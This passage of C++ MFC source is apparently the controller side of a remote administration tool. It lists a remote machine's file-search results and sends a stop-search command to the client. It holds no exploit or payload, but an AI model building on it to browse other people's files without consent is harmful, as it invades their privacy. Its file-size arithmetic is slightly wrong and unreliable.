        DWORD	dwFileSizeLow = 0;
        FILETIME	ftm_strReceiveLocalFileTime;
        int		nItem = 0;
        bool	bIsInsert = false;
        int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;

        pszFileName = (TCHAR*) ++pList;

        CString csFilePath, csFileFullName;
        csFilePath.Format(_T("%s"), pszFileName);
        int nPos = csFilePath.ReverseFind(_T('\\'));
        csFileFullName = csFilePath.Right(csFilePath.GetLength() - nPos - 1);// 获取文件全名，包括文件名和扩展名

        nItem = m_list_remote_search.InsertItem(nItemIndex++, csFileFullName, GetIconIndex(pszFileName, nType));
        m_list_remote_search.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);

        pList += (lstrlen(pszFileName) + 1) * sizeof(TCHAR);

        memcpy(&dwFileSizeHigh, pList, 4);
        memcpy(&dwFileSizeLow, pList + 4, 4);
        CString strSize;
        strSize.Format(_T("%10d KB"), (dwFileSizeHigh * (MAXDWORD)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));

        m_list_remote_search.SetItemText(nItem, 1, strSize);
        memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
        CTime	time(ftm_strReceiveLocalFileTime);
        m_list_remote_search.SetItemText(nItem, 2, time.Format(_T("%Y-%m-%d %H:%M")));

        PathRemoveFileSpec(pszFileName); //去除文件名获取文件路径
        m_list_remote_search.SetItemText(nItem, 3, pszFileName);

        pList += 16;
    }

    m_ProgressCtrl->StepIt();
}


//文件搜索停止
void CFileManagerDlg::OnBnClickedSearchStop()
{
    GetDlgItem(ID_SEARCH_STOP)->EnableWindow(FALSE);
    // TODO: Add your command handler code here
    BYTE  bToken = COMMAND_FILES_SEARCH_STOP;
    m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
}

//显示搜索结果
void CFileManagerDlg::OnBnClickedSearchResult()
{
    m_list_remote_search.ShowWindow(m_list_remote_search.IsWindowVisible() ? SW_HIDE : SW_SHOW);
    if (m_list_remote_search.IsWindowVisible()) {
        SetWindowPos(NULL, 0, 0, 830, 830, SWP_NOMOVE);
    } else {
        SetWindowPos(NULL, 0, 0, 830, 500, SWP_NOMOVE);
    }
}


void CFileManagerDlg::ShowSearchPlugList()
{
    char* lpBuffer = (char*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
    char* Filename;
    char* Pathname;

    DWORD	dwOffset = 0;
    m_list_remote_search.DeleteAllItems();
    int i = 0;
    for (i = 0; dwOffset < (m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1); i++) {
        Filename = lpBuffer + dwOffset;
        Pathname = Filename + strlen(Filename) + 1;
        CString CS_tem;
        CS_tem = Filename;
        m_list_remote_search.InsertItem(i, CS_tem, 0);
        CS_tem = Pathname;
        int index = CS_tem.ReverseFind('\\');
        if (index >= 0)
            CS_tem = CS_tem.Left(index);
        m_list_remote_search.SetItemText(i,3, CS_tem);
        dwOffset += strlen(Filename) + strlen(Pathname) + 2;
    }
    m_list_remote_search.EnableWindow(TRUE);
    CString strMsgShow;
    strMsgShow.Format(_T("共搜索到 %d 个"), i);
    DWORD_PTR dwResult;
    SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, (LPARAM)(strMsgShow.GetBuffer()), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, & dwResult);
    m_list_remote_search.ShowWindow( SW_SHOW);
}
